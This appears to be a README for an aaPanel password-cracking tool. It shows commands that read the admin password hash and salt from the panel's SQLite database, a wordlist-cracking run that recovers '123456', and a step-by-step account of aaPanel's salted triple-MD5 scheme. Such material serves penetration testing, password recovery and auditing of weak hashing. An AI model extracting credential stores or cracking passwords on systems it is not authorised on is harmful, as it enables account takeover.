
# aaPanel Password Cracking Tool

##  Quick Start
Tested on : aaPanel 7.0.20, Ubuntu 20.04.6 LTS (Focal Fossa)


```bash
python3 aapanel_pass_cracker.py \
  -H "e9309e83303b6ecc5f2db374121aee0f" \
  -s "XrtEK6vu0Mb9" \
  -w /usr/share/wordlists/rockyou.txt
```

**Sample Output:**

```
Starting aaPanel Hash Cracker
Target Hash: e9309e83303b6ecc5f2db374121aee0f
Salt:        XrtEK6vu0Mb9
Wordlist:    /usr/share/wordlists/rockyou.txt

[+] Password found: 123456
    Tried 1 passwords
```

---

##  Prerequisites

###  Verify Hash Algorithm (Critical!)

Make sure your aaPanel instance uses the expected hash logic:

```bash
grep -A 5 "def password_salt" /www/server/panel/class/public/common.py
```

Check the output includes:

```python
"_bt.cn"
```

>  Some older/altered installations may use `"BT.cn"` instead.

---

###  Extract Credentials from aaPanel DB

You need the **password hash** and the **salt** from the database:

```bash
sqlite3 /www/server/panel/data/default.db "SELECT password,salt FROM users WHERE id=1;"
```

**Expected Output Format:**

```
e9309e83303b6ecc5f2db374121aee0f|XrtEK6vu0Mb9
```

---

##  aapanel Hashing Algorithm Explained

###  Step-by-Step Transformation

```python
# 1. First MD5 (raw password)
md5("123456") → "e10adc3949ba59abbe56e057f20f883e"

# 2. Add fixed suffix
"e10adc3949ba59abbe56e057f20f883e" + "_bt.cn"
→ "e10adc3949ba59abbe56e057f20f883e_bt.cn"

# 3. Second MD5
md5("e10adc3949ba59abbe56e057f20f883e_bt.cn")
→ "5b9d2a2288d21b3b6e1172ceb5f9d8b8"

# 4. Append salt
"5b9d2a2288d21b3b6e1172ceb5f9d8b8" + "XrtEK6vu0Mb9"
→ "5b9d2a2288d21b3b6e1172ceb5f9d8b8XrtEK6vu0Mb9"

# 5. Final MD5
md5("5b9d2a2288d21b3b6e1172ceb5f9d8b8XrtEK6vu0Mb9")
→ "e9309e83303b6ecc5f2db374121aee0f"
```

---

📌 **Author**: Huseyin Mardinli
